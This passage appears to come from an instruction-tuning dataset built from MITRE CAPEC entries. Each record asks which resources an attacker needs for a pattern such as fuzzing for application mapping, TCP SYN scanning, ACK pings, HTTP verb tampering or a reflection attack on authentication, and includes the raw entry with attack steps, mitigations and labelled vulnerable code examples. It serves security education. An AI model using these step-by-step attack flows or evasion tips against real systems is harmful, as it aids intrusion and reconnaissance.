              "Impact": [
                "Bypass Protection Mechanism",
                "Hide Activities"
              ]
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-33",
            "@Section": "Chapter 2: Scanning, pp. 38"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": {
            "Modification_Name": "CAPEC Content Team",
            "Modification_Organization": "The MITRE Corporation",
            "Modification_Date": "2018-07-31",
            "Modification_Comment": "Updated Attack_Prerequisites, Description Summary, Related_Weaknesses"
          }
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: Fuzzing for application mapping (CAPEC ID: 215)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern Fuzzing for application mapping (CAPEC ID: 215):\nFuzzing tools, which automatically generate and send message variants, are necessary for this attack. The attacker must have sufficient access to send messages to the target. The attacker must also have the ability to observe the target application's log and/or error messages in order to collect information about the target.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Fuzzing tools, which automatically generate and send message variants, are necessary for this attack. The attacker must have sufficient access to send messages to the target. The attacker must also have the ability to observe the target application's log and/or error messages in order to collect information about the target.",
      "@Name": "Fuzzing for application mapping (CAPEC ID: 215)",
      "attack_ptrn": {
        "@ID": "215",
        "@Name": "Fuzzing for application mapping",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker sends random, malformed, or otherwise unexpected messages to a target application and observes the application's log or error messages returned. The attacker does not initially know how a target will respond to individual messages but by attempting a large number of message variants they may find a variant that trigger's desired behavior. In this attack, the purpose of the fuzzing is to observe the application's log and error messages, although fuzzing a target can also sometimes cause the target to enter an unstable state, causing a crash.",
        "Extended_Description": {
          "xhtml:p": "By observing logs and error messages, the attacker can learn details about the configuration of the target application and might be able to cause the target to disclose sensitive information. In applications that return a stack trace along with the error, this can enumerate the chain of methods that led up to the point where the error was encountered. This can not only reveal the names of the methods (some of which may have known weaknesses) but possibly also the location of class files and libraries as well as parameter values. In some cases, the stack trace might even disclose sensitive configuration or user information."
        },
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "54"
            },
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "28"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Observe communication and inputs] The fuzzing adversary observes the target system looking for inputs and communications between modules, subsystems, or systems.",
              "Technique": [
                "Network sniffing. Using a network sniffer such as wireshark, the adversary observes communications into and out of the target system.",
                "Monitor API execution. Using a tool such as ktrace, strace, APISpy, or another debugging tool, the adversary observes the system calls and API calls that are made by the target system, and the nature of their parameters.",
                "Observe inputs using web inspection tools (OWASP's WebScarab, Paros, TamperData, TamperIE, etc.)"
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Generate fuzzed inputs] Given a fuzzing tool, a target input or protocol, and limits on time, complexity, and input variety, generate a list of inputs to try. Although fuzzing is random, it is not exhaustive. Parameters like length, composition, and how many variations to try are important to get the most cost-effective impact from the fuzzer.",
              "Technique": [
                "Boundary cases. Generate fuzz inputs that attack boundary cases of protocol fields, inputs, or other communications limits. Examples include 0xff and 0x00 for single-byte inputs. In binary situations, approach each bit of an individual field with on and off (e.g., 0x80).",
                "Attempt arguments to system calls or APIs. The variations include payloads that, if they were successful, could lead to a compromise on the system."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Observe the outcome] Observe the outputs to the inputs fed into the system by fuzzers and see if there are any log or error messages that might provide information to map the application"
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Craft exploit payloads] An adversary usually needs to modify the fuzzing parameters according to the observed error messages to get the desired sensitive information for the application. To defeat correlation, the adversary may try changing the origin IP addresses or client browser identification strings or start a new session from where they left off in obfuscating the attack.",
              "Technique": [
                "Modify the parameters in the fuzzing tool according to the observed error messages. Repeat with enough parameters until the application has been sufficiently mapped.",
                "If the application rejects the large amount of fuzzing messages from the same host machine, the adversary needs to hide the attacks by changing the IP addresses or other credentials."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The target application must fail to sanitize incoming messages adequately before processing."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "Although fuzzing parameters is not difficult, and often possible with automated fuzzing tools, interpreting the error conditions and modifying the parameters so as to move further in the process of mapping the application requires detailed knowledge of target platform, the languages and packages used as well as software design."
          }
        },
        "Resources_Required": {
          "Resource": "Fuzzing tools, which automatically generate and send message variants, are necessary for this attack. The attacker must have sufficient access to send messages to the target. The attacker must also have the ability to observe the target application's log and/or error messages in order to collect information about the target."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Other",
            "Note": "Information Leakage"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Construct a 'code book' for error messages. When using a code book, application error messages aren't generated in string or stack trace form, but are catalogued and replaced with a unique (often integer-based) value 'coding' for the error. Such a technique will require helpdesk and hosting personnel to use a 'code book' or similar mapping to decode application errors/logs in order to respond to them normally.",
            "Design: wrap application functionality (preferably through the underlying framework) in an output encoding scheme that obscures or cleanses error messages to prevent such attacks. Such a technique is often used in conjunction with the above 'code book' suggestion.",
            "Implementation: Obfuscate server fields of HTTP response.",
            "Implementation: Hide inner ordering of HTTP response header.",
            "Implementation: Customizing HTTP error codes such as 404 or 500.",
            "Implementation: Hide HTTP response header software information filed.",
            "Implementation: Hide cookie's software information filed.",
            "Implementation: Obfuscate database type in Database API's error message."
          ]
        },
        "Example_Instances": {
          "Example": [
            {
              "xhtml:p": [
                "The following code generates an error message that leaks the full pathname of the configuration file.",
                "If this code is running on a server, such as a web application, then the person making the request should not know what the full pathname of the configuration directory is. By submitting a username that does not produce a $file that exists, an attacker could get this pathname. It could then be used to exploit path traversal or symbolic link following problems that may exist elsewhere in the application."
              ],
              "xhtml:div": {
                "@style": "margin-left:1em;",
                "@class": "bad",
                "xhtml:br": [
                  null,
                  null,
                  null,
                  null,
                  null
                ],
                "#text": "$ConfigDir = \"/home/myprog/config\";$uname = GetUserInput(\"username\");ExitError(\"Bad hacker!\") if ($uname !~ /^\\w+$/);$file = \"$ConfigDir/$uname.txt\";if (! (-e $file)) { ExitError(\"Error: $file does not exist\"); }..."
              }
            },
            {
              "xhtml:p": [
                "In languages that utilize stack traces, revealing them can give adversaries information that allows them to map functions and file locations for an application. The following Java method prints out a stack trace that exposes the application to this attack pattern.",
                "If this code is running on a server, such as a web application, then the adversary could cause the exception to be printed through fuzzing."
              ],
              "xhtml:div": {
                "@style": "margin-left:1em;",
                "@class": "bad",
                "xhtml:div": {
                  "@style": "margin-left:1em;",
                  "xhtml:div": [
                    {
                      "@style": "margin-left:1em;",
                      "#text": "processRequest();"
                    },
                    {
                      "@style": "margin-left:1em;",
                      "#text": "ex.printStackTrace(response.getWriter());"
                    },
                    {
                      "@style": "margin-left:1em;",
                      "#text": "return;"
                    }
                  ],
                  "#text": "try {} catch (Exception ex) {\n                     }"
                },
                "#text": "public void httpGet(HttpServletRequest request, HttpServletResponse response) {}"
              }
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "209"
            },
            {
              "@CWE_ID": "532"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated @Name, Description, Example_Instances, Execution_Flow, Related_Attack_Patterns, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Example_Instances"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2020-12-17",
            "#text": "Fuzzing and observing application log data/errors for application mapping"
          }
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: TCP (ISN) Sequence Predictability Probe (CAPEC ID: 324)",
    "context": "",
    "output": "required resources:\nA tool capable of sending and receiving packets from a remote system.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "A tool capable of sending and receiving packets from a remote system.",
      "@Name": "TCP (ISN) Sequence Predictability Probe (CAPEC ID: 324)",
      "attack_ptrn": {
        "@ID": "324",
        "@Name": "TCP (ISN) Sequence Predictability Probe",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "This type of operating system probe attempts to determine an estimate for how predictable the sequence number generation algorithm is for a remote host. Statistical techniques, such as standard deviation, can be used to determine how predictable the sequence number generation is for a system. This result can then be compared to a database of operating system behaviors to determine a likely match for operating system and version.",
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "312"
          }
        },
        "Prerequisites": {
          "Prerequisite": "The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card."
        },
        "Resources_Required": {
          "Resource": "A tool capable of sending and receiving packets from a remote system."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": [
                "Bypass Protection Mechanism",
                "Hide Activities"
              ]
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-33",
              "@Section": "Chapter 2: Scanning, pg. 56"
            },
            {
              "@External_Reference_ID": "REF-128"
            },
            {
              "@External_Reference_ID": "REF-212",
              "@Section": "Chapter 8. Remote OS Detection"
            },
            {
              "@External_Reference_ID": "REF-130"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated References, Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: TCP SYN Scan (CAPEC ID: 287)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern TCP SYN Scan (CAPEC ID: 287):\nThe ability to send TCP SYN segments to a host during network reconnaissance via the use of a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The ability to send TCP SYN segments to a host during network reconnaissance via the use of a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.",
      "@Name": "TCP SYN Scan (CAPEC ID: 287)",
      "attack_ptrn": {
        "@ID": "287",
        "@Name": "TCP SYN Scan",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary uses a SYN scan to determine the status of ports on the remote target. SYN scanning is the most common type of port scanning that is used because of its many advantages and few drawbacks. As a result, novice attackers tend to overly rely on the SYN scan while performing system reconnaissance. As a scanning method, the primary advantages of SYN scanning are its universality and speed.",
        "Extended_Description": {
          "xhtml:p": "RFC 793 defines the required behavior of any TCP/IP device in that an incoming connection request begins with a SYN packet, which in turn must be followed by a SYN/ACK packet from the receiving service. For this reason, like TCP Connect scanning, SYN scanning works against any TCP stack. Unlike TCP Connect scanning, it is possible to scan thousands of ports per second using this method. This type of scanning is usually referred to as 'half-open' scanning because it does not complete the three-way handshake. The scanning rate is extremely fast because no time is wasted completing the handshake or tearing down the connection. This technique allows an attacker to scan through stateful firewalls due to the common configuration that TCP SYN segments for a new connection will be allowed for almost any port. TCP SYN scanning can also immediately detect 3 of the 4 important types of port status: open, closed, and filtered."
        },
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "300"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Experiment",
              "Description": "An adversary sends SYN packets to ports they want to scan and checks the response without completing the TCP handshake."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "An adversary uses the response from the target to determine the port's state. The adversary can determine the state of a port based on the following responses. When a SYN is sent to an open port and unfiltered port, a SYN/ACK will be generated. When a SYN packet is sent to a closed port a RST is generated, indicating the port is closed. When SYN scanning to a particular port generates no response, or when the request triggers ICMP Type 3 unreachable errors, the port is filtered."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "This scan type is not possible with some operating systems (Windows XP SP 2). On Linux and Unix systems it requires root privileges to use raw sockets."
        },
        "Resources_Required": {
          "Resource": "The ability to send TCP SYN segments to a host during network reconnaissance via the use of a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Other",
              "Note": "A successful attack of this kind can identify open ports and available services on a system."
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": [
                "Bypass Protection Mechanism",
                "Hide Activities"
              ]
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-33",
              "@Section": "Chapter 2: Scanning, pg. 56"
            },
            {
              "@External_Reference_ID": "REF-128"
            },
            {
              "@External_Reference_ID": "REF-34",
              "@Section": "Section 5.32 TCP SYN (Stealth) Scan, pg. 100"
            },
            {
              "@External_Reference_ID": "REF-130"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Description, Description Summary, References, Related_Weaknesses, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Description, Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Reflection Attack in Authentication Protocol (CAPEC ID: 90), tell me required resources from an attacker",
    "context": "",
    "output": "Sure. Here are the required resources the attacker should have:\nAll that the attacker requires is a means to observe and understand the protocol exchanges in order to reflect the challenges appropriately.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "All that the attacker requires is a means to observe and understand the protocol exchanges in order to reflect the challenges appropriately.",
      "@Name": "Reflection Attack in Authentication Protocol (CAPEC ID: 90)",
      "attack_ptrn": {
        "@ID": "90",
        "@Name": "Reflection Attack in Authentication Protocol",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary can abuse an authentication protocol susceptible to reflection attack in order to defeat it. Doing so allows the adversary illegitimate access to the target system, without possessing the requisite credentials. Reflection attacks are of great concern to authentication protocols that rely on a challenge-handshake or similar mechanism. An adversary can impersonate a legitimate user and can gain illegitimate access to the system by successfully mounting a reflection attack during authentication.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "272",
              "Exclude_Related": {
                "@Exclude_ID": "513"
              }
            },
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "114",
              "Exclude_Related": {
                "@Exclude_ID": "515"
              }
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Identify service with vulnerable handshake authentication] The adversary must first identify a vulnerable authentication protocol. The most common indication of an authentication protocol vulnerable to reflection attack is when the client initiates the handshake, rather than the server. This allows the client to get the server to encrypt targeted data using the server's pre-shared key."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Send challenge to target server] The adversary opens a connection to the target server and sends it a challenge. This challenge is arbitrary and is simply used as a placeholder for the protocol in order to get the server to respond."
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Receive server challenge] The server responds by returning the challenge sent encrypted with the server's pre-shared key, as well as its own challenge to the attacker sent in plaintext. We will call this challenge sent by the server \"C\". C is very important and is stored off by the adversary for the next step."
            },
            {
              "Step": "4",
              "Phase": "Experiment",
              "Description": "[Initiate second handshake] Since the adversary does not possess the pre-shared key, they cannot encrypt C from the previous step in order for the server to authenticate them. To get around this, the adversary initiates a second connection to the server while still keeping the first connection alive. In the second connection, the adversary sends C as the initial client challenge, which rather than being arbitary like the first connection, is very intentional."
            },
            {
              "Step": "5",
              "Phase": "Experiment",
              "Description": "[Receive encrypted challenge] The server treats the intial client challenge in connection two as an arbitrary client challenge and responds by encrypting C with the pre-shared key. The server also sends a new challenge. The adversary ignores the server challenge and stores the encrypted version of C. The second connection is either terminated or left to expire by the adversary as it is no longer needed."
            },
            {
              "Step": "6",
              "Phase": "Exploit",
              "Description": "The adversary now posseses the encrypted version of C that is obtained through connection two. The adversary continues the handshake in connection one by responding to the server with the encrypted version of C, verifying that they have access to the pre-shared key (when they actually do not). Because the server uses the same pre-shared key for all authentication it will decrypt C and authenticate the adversary for the first connection, giving the adversary illegitimate access to the target system."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The attacker must have direct access to the target server in order to successfully mount a reflection attack. An intermediate entity, such as a router or proxy, that handles these exchanges on behalf of the attacker inhibits the attackers' ability to attack the authentication protocol."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "The attacker needs to have knowledge of observing the protocol exchange and managing the required connections in order to issue and respond to challenges"
          }
        },
        "Resources_Required": {
          "Resource": "All that the attacker requires is a means to observe and understand the protocol exchanges in order to reflect the challenges appropriately."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": [
                "Gain Privileges",
                "Bypass Protection Mechanism"
              ]
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "The server must initiate the handshake by issuing the challenge. This ensures that the client has to respond before the exchange can move any further",
            "The use of HMAC to hash the response from the server can also be used to thwart reflection. The server responds by returning its own challenge as well as hashing the client's challenge, its own challenge and the pre-shared secret. Requiring the client to respond with the HMAC of the two challenges ensures that only the possessor of a valid pre-shared secret can successfully hash in the two values.",
            "Introducing a random nonce with each new connection ensures that the attacker cannot employ two connections to attack the authentication protocol"
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "A single sign-on solution for a network uses a fixed pre-shared key with its clients to initiate the sign-on process in order to avoid eavesdropping on the initial exchanges.",
              "An attacker can use a reflection attack to mimic a trusted client on the network to participate in the sign-on exchange."
            ]
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "301"
            },
            {
              "@CWE_ID": "303"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated @Abstraction, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Execution_Flow, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Description, Execution_Flow"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: HTTP Verb Tampering (CAPEC ID: 274)",
    "context": "",
    "output": "required resources:\nThe attacker requires a tool that allows them to manually control the HTTP verb used to send messages to the targeted server.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The attacker requires a tool that allows them to manually control the HTTP verb used to send messages to the targeted server.",
      "@Name": "HTTP Verb Tampering (CAPEC ID: 274)",
      "attack_ptrn": {
        "@ID": "274",
        "@Name": "HTTP Verb Tampering",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker modifies the HTTP Verb (e.g. GET, PUT, TRACE, etc.) in order to bypass access restrictions. Some web environments allow administrators to restrict access based on the HTTP Verb used with requests. However, attackers can often provide a different HTTP Verb, or even provide a random string as a verb in order to bypass these protections. This allows the attacker to access data that should otherwise be protected.",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "220",
            "Exclude_Related": {
              "@Exclude_ID": "512"
            }
          }
        },
        "Prerequisites": {
          "Prerequisite": "The targeted system must attempt to filter access based on the HTTP verb used in requests."
        },
        "Resources_Required": {
          "Resource": "The attacker requires a tool that allows them to manually control the HTTP verb used to send messages to the targeted server."
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Ensure that only legitimate HTTP verbs are allowed.",
            "Design: Do not use HTTP verbs as factors in access decisions."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "302"
            },
            {
              "@CWE_ID": "654"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-118"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": {
            "Modification_Name": "CAPEC Content Team",
            "Modification_Organization": "The MITRE Corporation",
            "Modification_Date": "2019-09-30",
            "Modification_Comment": "Updated Related_Attack_Patterns"
          }
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: TCP ACK Ping (CAPEC ID: 297)",
    "context": "",
    "output": "The resources required to execute TCP ACK Ping (CAPEC ID: 297) are the following: ACK scanning can be performed via the use of a port scanner or by raw socket manipulation using a scripting or programming language. Packet injection tools are also useful for this purpose. Depending upon the technique used it may also be necessary to sniff the network in order to see the response.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "ACK scanning can be performed via the use of a port scanner or by raw socket manipulation using a scripting or programming language. Packet injection tools are also useful for this purpose. Depending upon the technique used it may also be necessary to sniff the network in order to see the response.",
      "@Name": "TCP ACK Ping (CAPEC ID: 297)",
      "attack_ptrn": {
        "@ID": "297",
        "@Name": "TCP ACK Ping",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary sends a TCP segment with the ACK flag set to a remote host for the purpose of determining if the host is alive. This is one of several TCP 'ping' types. The RFC 793 expected behavior for a service is to respond with a RST 'reset' packet to any unsolicited ACK segment that is not part of an existing connection. So by sending an ACK segment to a port, the adversary can identify that the host is alive by looking for a RST packet. Typically, a remote server will respond with a RST regardless of whether a port is open or closed. In this way, TCP ACK pings cannot discover the state of a remote port because the behavior is the same in either case. The firewall will look up the ACK packet in its state-table and discard the segment because it does not correspond to any active connection. A TCP ACK Ping can be used to discover if a host is alive via RST response packets sent from the host.",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "292",
            "Exclude_Related": {
              "@Exclude_ID": "512"
            }
          }
        },
        "Prerequisites": {
          "Prerequisite": [
            "The ability to send an ACK packet to a remote host and identify the response. Creating the ACK packet without building a full connection requires the use of raw sockets. As a result, it is not possible to send a TCP ACK ping from some systems (Windows XP SP 2) without the use of third-party packet drivers like Winpcap. On other systems (BSD, Linux) administrative privileges are required in order to write to the raw socket.",
            "The target must employ a stateless firewall that lacks a rule set that rejects unsolicited ACK packets.",
            "The adversary requires the ability to craft custom TCP ACK segments for use during network reconnaissance. Sending an ACK ping requires the ability to access \"raw sockets\" in order to create the packets with direct access to the packet header."
          ]
        },
        "Resources_Required": {
          "Resource": "ACK scanning can be performed via the use of a port scanner or by raw socket manipulation using a scripting or programming language. Packet injection tools are also useful for this purpose. Depending upon the technique used it may also be necessary to sniff the network in order to see the response."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Other"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": [
                "Bypass Protection Mechanism",
                "Hide Activities"
              ]
            }
          ]
        },
        "Mitigations": {
          "Mitigation": "Leverage stateful firewalls that allow for the rejection of a packet that is not part of an existing connection."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-33",
              "@Section": "Chapter 2: Scanning, pg. 49"
            },
            {
              "@External_Reference_ID": "REF-128"
            },
            {
              "@External_Reference_ID": "REF-34",
              "@Section": "Section 3.6.2 TCP ACK Ping, pg. 61"
            },
            {
              "@External_Reference_ID": "REF-125"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Prerequisites, Description, Description Summary, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: Generic Cross-Browser Cross-Domain Theft (CAPEC ID: 468)",
    "context": "",
    "output": "The resources required to execute Generic Cross-Browser Cross-Domain Theft (CAPEC ID: 468) are the following: Attacker controlled site/page to render a page referencing the injected CSS string",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Attacker controlled site/page to render a page referencing the injected CSS string",
      "@Name": "Generic Cross-Browser Cross-Domain Theft (CAPEC ID: 468)",
      "attack_ptrn": {
        "@ID": "468",
        "@Name": "Generic Cross-Browser Cross-Domain Theft",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An attacker makes use of Cascading Style Sheets (CSS) injection to steal data cross domain from the victim's browser. The attack works by abusing the standards relating to loading of CSS: 1. Send cookies on any load of CSS (including cross-domain) 2. When parsing returned CSS ignore all data that does not make sense before a valid CSS descriptor is found by the CSS parser.",
        "Extended_Description": {
